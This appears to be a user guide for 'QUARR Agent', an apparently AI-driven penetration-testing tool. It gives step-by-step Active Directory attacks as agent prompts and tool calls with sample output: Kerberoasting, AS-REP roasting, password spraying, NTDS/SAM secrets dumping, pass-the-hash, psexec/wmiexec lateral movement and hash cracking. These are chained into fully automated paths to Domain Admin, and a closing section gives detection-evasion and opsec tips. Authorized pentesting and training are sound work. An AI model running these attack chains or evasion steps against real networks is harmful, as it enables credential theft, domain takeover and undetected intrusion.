# Active Directory Pentest Guide — QUARR Agent

Complete guide for Active Directory penetration testing with QUARR Agent.

---

## Table of Contents

1. [Overview](#1-overview)
2. [Prerequisites](#2-prerequisites)
3. [AD Enumeration Tools (4)](#3-ad-enumeration-tools-4)
4. [AD Attack Tools (7)](#4-ad-attack-tools-7)
5. [Attack Methodology](#5-attack-methodology)
6. [Scenario: Full AD Pentest](#6-scenario-full-ad-pentest)
7. [Scenario: Targeted Attacks](#7-scenario-targeted-attacks)
8. [BloodHound Integration](#8-bloodhound-integration)
9. [Common Attack Paths](#9-common-attack-paths)
10. [Defense Evasion Tips](#10-defense-evasion-tips)

---

## 1. Overview

QUARR Agent provides **11 Active Directory tools** for comprehensive AD penetration testing:

| Category | Tools | Function |
|----------|-------|----------|
| **Enumeration** | 4 tools | LDAP, RPC, BloodHound data collection |
| **Attack** | 7 tools | Kerberos attacks, credential dumping, lateral movement |

### Tool Summary

| Tool | Impacket/Kali | Risk Level |
|------|---------------|------------|
| `ldap_search` | ldapsearch | Low |
| `ldap_domain_dump` | ldapdomaindump | Low |
| `bloodhound_collect` | bloodhound-python | Low |
| `rpc_enum` | rpcclient | Low |
| `kerberos_asrep_roast` | GetNPUsers.py | High |
| `kerberos_kerberoast` | GetUserSPNs.py | High |
| `password_spray` | crackmapexec | High |
| `secrets_dump` | secretsdump.py | Critical |
| `psexec` | psexec.py | Critical |
| `wmiexec` | wmiexec.py | Critical |
| `hash_crack` | hashcat | Low |

---

## 2. Prerequisites

### Required Tools

```bash
# Impacket suite
sudo apt install -y python3-impacket
# Or latest version via pip
pip install impacket

# CrackMapExec
sudo apt install -y crackmapexec

# LDAP tools
sudo apt install -y ldap-utils
pip install ldapdomaindump

# BloodHound
pip install bloodhound

# Password cracking
sudo apt install -y hashcat
```

### Verify Installation

```bash
# Check Impacket
python3 -c "from impacket import version; print(f'Impacket OK')"

# Check CrackMapExec
crackmapexec --version

# Check BloodHound Python
bloodhound-python --help
```

### Network Requirements

- Network access to Domain Controller (DC)
- Common ports: 88 (Kerberos), 389 (LDAP), 445 (SMB), 135 (RPC)

---

## 3. AD Enumeration Tools (4)

### ldap_search

Query LDAP for users, groups, computers.

```
🔐 quarr> LDAP search for users on domain corp.local DC 10.10.10.10 user john password Pass123

⚙️ ldap_search(target=10.10.10.10, domain=corp.local, username=john, password=Pass123, query=users)
→ Found 150 users
→ Domain Admins: Administrator, svc_admin
→ Service accounts: svc_sql, svc_backup
```

**Anonymous LDAP (if allowed):**

```
🔐 quarr> Anonymous LDAP enumeration on 10.10.10.10 domain corp.local

⚙️ ldap_search(target=10.10.10.10, domain=corp.local, query=all)
```

---

### ldap_domain_dump

Full domain dump — users, groups, computers, policies.

```
🔐 quarr> Full LDAP domain dump corp.local DC 10.10.10.10 user john password Pass123

⚙️ ldap_domain_dump(target=10.10.10.10, domain=corp.local, username=john, password=Pass123)
→ Output: /tmp/ldapdomaindump/
→ Files: domain_users.json, domain_groups.json, domain_computers.json, domain_policy.json
```

Output files can be used for offline analysis.

---

### bloodhound_collect

Collect data for BloodHound graph analysis.

```
🔐 quarr> BloodHound collection on corp.local DC 10.10.10.10 user john password Pass123

⚙️ bloodhound_collect(domain=corp.local, dc_ip=10.10.10.10, username=john, password=Pass123)
→ Collection: Default
→ Output: /tmp/bloodhound/
→ Files: *_users.json, *_groups.json, *_computers.json, *_domains.json
```

**Collection methods:**

| Method | Data Collected |
|--------|----------------|
| Default | Users, groups, computers, domains |
| All | Everything including sessions, ACLs |
| Session | Active sessions only |
| ACL | Access control lists |

```
🔐 quarr> BloodHound full collection (All) on corp.local

⚙️ bloodhound_collect(domain=corp.local, dc_ip=10.10.10.10, username=john, password=Pass123, collection=All)
```

---

### rpc_enum

RPC enumeration via null session or authenticated.

```
🔐 quarr> RPC enumeration on 10.10.10.10

⚙️ rpc_enum(target=10.10.10.10)
→ Null session: ALLOWED
→ Domain: CORP
→ Domain SID: S-1-5-21-...
→ Users: Administrator, Guest, john.doe, jane.smith
→ Groups: Domain Admins, Domain Users, IT Admins
```

---

## 4. AD Attack Tools (7)

### kerberos_asrep_roast

AS-REP Roasting — extract hashes for users without Kerberos pre-authentication.

```
🔐 quarr> AS-REP Roasting on domain corp.local DC 10.10.10.10

⚙️ kerberos_asrep_roast(domain=corp.local, dc_ip=10.10.10.10)
→ Vulnerable users found: 2
→ svc_backup: $krb5asrep$23$svc_backup@CORP.LOCAL:...
→ svc_legacy: $krb5asrep$23$svc_legacy@CORP.LOCAL:...
→ Hashes saved: /tmp/asrep_hashes.txt
```

**With user list:**

```
🔐 quarr> AS-REP Roasting with user list /tmp/users.txt

⚙️ kerberos_asrep_roast(domain=corp.local, dc_ip=10.10.10.10, userlist=/tmp/users.txt)
```

---

### kerberos_kerberoast

Kerberoasting — extract TGS hashes for service accounts.

```
🔐 quarr> Kerberoast on corp.local DC 10.10.10.10 user john password Pass123

⚙️ kerberos_kerberoast(domain=corp.local, dc_ip=10.10.10.10, username=john, password=Pass123)
→ SPN accounts found: 3
→ svc_sql (MSSQLSvc/db01.corp.local): $krb5tgs$23$*...
→ svc_http (HTTP/web01.corp.local): $krb5tgs$23$*...
→ svc_backup (CIFS/backup01.corp.local): $krb5tgs$23$*...
→ Hashes saved: /tmp/kerberoast_hashes.txt
```

---

### password_spray

Password spraying — test one password against many users.

```
🔐 quarr> Password spray on 10.10.10.10 users /tmp/users.txt password Summer2024!

⚙️ password_spray(target=10.10.10.10, userlist=/tmp/users.txt, password=Summer2024!)
→ Testing 150 users with password: Summer2024!
→ Valid credentials found: 3
→ john.doe:Summer2024!
→ jane.smith:Summer2024!
→ tom.wilson:Summer2024!
```

**Protocols:**

| Protocol | Use Case |
|----------|----------|
| smb | Default, most reliable |
| ldap | LDAP authentication |
| winrm | WinRM access |

```
🔐 quarr> Password spray via LDAP protocol

⚙️ password_spray(target=10.10.10.10, userlist=/tmp/users.txt, password=Summer2024!, protocol=ldap)
```

⚠️ **Warning:** Be careful with account lockout policies!

---

### secrets_dump

Dump SAM, LSA secrets, and NTDS.dit hashes.

```
🔐 quarr> Dump secrets from DC 10.10.10.10 user Administrator password AdminPass domain corp.local

⚙️ secrets_dump(target=10.10.10.10, username=Administrator, password=AdminPass, domain=corp.local)
→ SAM hashes:
→   Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
→ Domain hashes (NTDS.dit):
→   krbtgt:502:aad3b435b51404ee:...
→   Administrator:500:aad3b435b51404ee:...
→ Output: /tmp/secrets_dump.txt
```

**With hash (Pass-the-Hash):**

```
🔐 quarr> Dump secrets using NTLM hash

⚙️ secrets_dump(target=10.10.10.10, username=Administrator, password=:31d6cfe0d16ae931b73c59d7e0c089c0, domain=corp.local)
```

---

### psexec

Remote command execution via SMB (creates service).

```
🔐 quarr> PSExec to 10.10.10.20 user admin password Pass123 command whoami

⚙️ psexec(target=10.10.10.20, username=admin, password=Pass123, command=whoami)
→ corp\admin

🔐 quarr> PSExec interactive shell

⚙️ psexec(target=10.10.10.20, username=admin, password=Pass123)
→ Interactive shell opened
```

---

### wmiexec

Remote command execution via WMI (stealthier than PSExec).

```
🔐 quarr> WMI exec on 10.10.10.20 user admin password Pass123 command ipconfig

⚙️ wmiexec(target=10.10.10.20, username=admin, password=Pass123, command=ipconfig)
→ Windows IP Configuration
→ Ethernet adapter Ethernet0:
→   IPv4 Address: 10.10.10.20
```

---

### hash_crack

Crack captured hashes with hashcat.

```
🔐 quarr> Crack Kerberoast hashes /tmp/kerberoast_hashes.txt mode 13100

⚙️ hash_crack(hash_file=/tmp/kerberoast_hashes.txt, mode=13100)
→ Cracking with rockyou.txt...
→ Cracked: 2/3
→ svc_sql:Summer2024!
→ svc_http:Password123
```

**Common hashcat modes:**

| Mode | Hash Type |
|------|-----------|
| 1000 | NTLM |
| 13100 | Kerberos 5 TGS-REP (Kerberoast) |
| 18200 | Kerberos 5 AS-REP (AS-REP Roast) |
| 5600 | NetNTLMv2 |

---

## 5. Attack Methodology

### Phase 1: Reconnaissance

```
Network Discovery → Service Enumeration → Identify DCs
```

```
🔐 quarr> Network discovery 10.10.10.0/24

⚙️ network_discovery(target=10.10.10.0/24)
→ 10.10.10.10 (DC01)
→ 10.10.10.20 (WORKSTATION01)
→ 10.10.10.30 (FILESERVER01)

🔐 quarr> Service enumeration 10.10.10.10

⚙️ service_enumeration(target=10.10.10.10, profile=full)
→ 88/tcp Kerberos
→ 389/tcp LDAP
→ 445/tcp SMB
→ 636/tcp LDAPS
→ Identified as Domain Controller
```

### Phase 2: Enumeration

```
LDAP → RPC → BloodHound → Identify targets
```

```
🔐 quarr> Full AD enumeration on corp.local DC 10.10.10.10

Agent runs:
1. rpc_enum (null session)
2. ldap_search (anonymous or with creds)
3. ldap_domain_dump
4. bloodhound_collect
```

### Phase 3: Initial Access

```
AS-REP Roast → Kerberoast → Password Spray → Crack hashes
```

```
🔐 quarr> Try initial access attacks on corp.local DC 10.10.10.10

Agent runs:
1. kerberos_asrep_roast (no creds needed)
2. kerberos_kerberoast (if creds available)
3. password_spray (with common passwords)
4. hash_crack (on captured hashes)
```

### Phase 4: Privilege Escalation & Lateral Movement

```
Secrets dump → PSExec/WMIExec → Repeat
```

```
🔐 quarr> Lateral movement to 10.10.10.20 with captured credentials

⚙️ wmiexec(target=10.10.10.20, username=svc_sql, password=Summer2024!, command=whoami /all)
```

### Phase 5: Domain Dominance

```
DC access → NTDS dump → Golden Ticket (manual)
```

```
🔐 quarr> Dump all domain hashes from DC

⚙️ secrets_dump(target=10.10.10.10, username=Administrator, password=AdminPass, domain=corp.local)
```

---

## 6. Scenario: Full AD Pentest

### Automated Full Pentest

```
🔐 quarr> Full AD pentest on network 10.10.10.0/24 domain corp.local

Agent automatically runs:

1. network_discovery(10.10.10.0/24)           ← Find hosts
2. service_enumeration(DC)                     ← Identify DC
3. rpc_enum(DC)                               ← Null session enum
4. ldap_search(DC, anonymous)                 ← Anonymous LDAP
5. kerberos_asrep_roast(corp.local, DC)       ← AS-REP Roast
   ↓ [If hashes found]
6. hash_crack(asrep_hashes, mode=18200)       ← Crack AS-REP
   ↓ [If creds obtained]
7. ldap_domain_dump(DC, creds)                ← Full domain dump
8. bloodhound_collect(corp.local, creds)      ← BloodHound data
9. kerberos_kerberoast(corp.local, creds)     ← Kerberoast
10. hash_crack(kerberoast_hashes, mode=13100) ← Crack Kerberoast
    ↓ [If more creds]
11. password_spray(DC, users, password)       ← Password spray
12. secrets_dump(target, admin_creds)         ← Dump secrets
→ Report + Findings
```

---

## 7. Scenario: Targeted Attacks

### AS-REP Roasting Only

```
🔐 quarr> AS-REP Roasting attack on corp.local DC 10.10.10.10

⚙️ kerberos_asrep_roast(domain=corp.local, dc_ip=10.10.10.10)
→ Found 2 vulnerable accounts

🔐 quarr> Crack the AS-REP hashes

⚙️ hash_crack(hash_file=/tmp/asrep_hashes.txt, mode=18200)
```

### Kerberoasting Chain

```
🔐 quarr> Kerberoast with creds john:Pass123 on corp.local DC 10.10.10.10

⚙️ kerberos_kerberoast(domain=corp.local, dc_ip=10.10.10.10, username=john, password=Pass123)

🔐 quarr> Crack Kerberoast hashes with custom wordlist

⚙️ hash_crack(hash_file=/tmp/kerberoast_hashes.txt, mode=13100, wordlist=/usr/share/wordlists/custom.txt)
```

### Lateral Movement Chain

```
🔐 quarr> With svc_sql:Summer2024!, move to 10.10.10.30

⚙️ wmiexec(target=10.10.10.30, username=svc_sql, password=Summer2024!, domain=corp.local, command=whoami)

🔐 quarr> Dump local hashes from 10.10.10.30

⚙️ secrets_dump(target=10.10.10.30, username=svc_sql, password=Summer2024!, domain=corp.local)
```

### Domain Admin Path

```
🔐 quarr> I have local admin on 10.10.10.30. Find path to Domain Admin.

Agent analyzes BloodHound data:
→ svc_sql → GenericAll on FILESERVER01 → Session of DA admin.jones
→ Recommendation: Dump credentials from FILESERVER01

🔐 quarr> Dump secrets from 10.10.10.30

⚙️ secrets_dump(target=10.10.10.30, username=svc_sql, password=Summer2024!)
→ Found: admin.jones NTLM hash
```

---

## 8. BloodHound Integration

### Collect Data

```
🔐 quarr> BloodHound collection corp.local DC 10.10.10.10 user john password Pass123 method All

⚙️ bloodhound_collect(domain=corp.local, dc_ip=10.10.10.10, username=john, password=Pass123, collection=All)
→ Output: /tmp/bloodhound/*.json
```

### Import to BloodHound GUI

```bash
# Start neo4j
sudo neo4j start

# Start BloodHound
bloodhound

# Import JSON files via GUI
# Drag and drop files from /tmp/bloodhound/
```

### Common Queries

After import, use BloodHound GUI to find:

1. **Shortest Path to Domain Admin**
2. **Kerberoastable Users**
3. **AS-REP Roastable Users**
4. **Unconstrained Delegation**
5. **Users with DCSync Rights**

---

## 9. Common Attack Paths

### Path 1: AS-REP → Kerberoast → DA

```
AS-REP Roast → Get svc_backup creds →
Kerberoast (with creds) → Get svc_sql creds →
svc_sql has GenericAll on DC → DCSync → DA
```

### Path 2: Password Spray → Lateral → DA

```
Password Spray → Get john.doe creds →
john.doe can RDP to WORKSTATION01 →
Local admin dumps creds → Find cached DA creds
```

### Path 3: Kerberoast → Service Account → DA

```
Kerberoast → Get svc_http creds →
svc_http runs on WEBSERVER with SeImpersonate →
Potato attack → SYSTEM → Dump creds → DA hash
```

### Path 4: BloodHound ACL Abuse

```
Low-priv user → GenericWrite on user2 →
Set SPN on user2 → Kerberoast user2 →
user2 in Server Operators → DA
```

---

## 10. Defense Evasion Tips

### Avoid Detection

| Action | Evasion Tip |
|--------|-------------|
| Enumeration | Use ldap_search instead of noisy scans |
| Password Spray | Limit to 1 attempt per user per hour |
| Lateral Movement | Use wmiexec (no service creation) over psexec |
| Credential Dumping | Target specific machines, not all |

### Tool-Specific Tips

```
# Quieter Kerberoast (request fewer tickets)
🔐 quarr> Kerberoast only high-value SPNs

# Use LDAPS when possible
🔐 quarr> LDAP search on port 636 (LDAPS)

# WMI is stealthier than PSExec
🔐 quarr> Use WMI exec instead of PSExec for lateral movement
```

### OpSec Checklist

- [ ] Check account lockout policy before spraying
- [ ] Use valid working hours for activity
- [ ] Minimize BloodHound collection (Default vs All)
- [ ] Clean up after secrets dump
- [ ] Monitor your own traffic for signatures
